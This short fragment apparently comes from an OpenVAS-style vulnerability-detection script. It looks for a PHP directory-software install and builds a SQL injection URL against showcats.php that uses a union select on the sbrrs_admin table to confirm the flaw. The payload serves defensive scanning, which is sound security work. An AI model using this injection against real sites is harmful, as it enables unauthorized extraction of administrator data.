...
foreach dir(make_list_unique("/resources", "/script", "/phpscript", http_cgi_dirs(port:port)))
{
  ...
  if('>Script Directory Software - directory software - PHP script directory software<' >< res)
  {
    url = dir + "/showcats.php?sbcat_id=-9999+union+all+select+2,concat" +
          "(0x" + vt_strings["default_hex"] + ",0x3a,0x3a,0x" + vt_strings["default_hex"] + ",0x3a),4,6,7+from+sbrrs" +
          "_admin--";
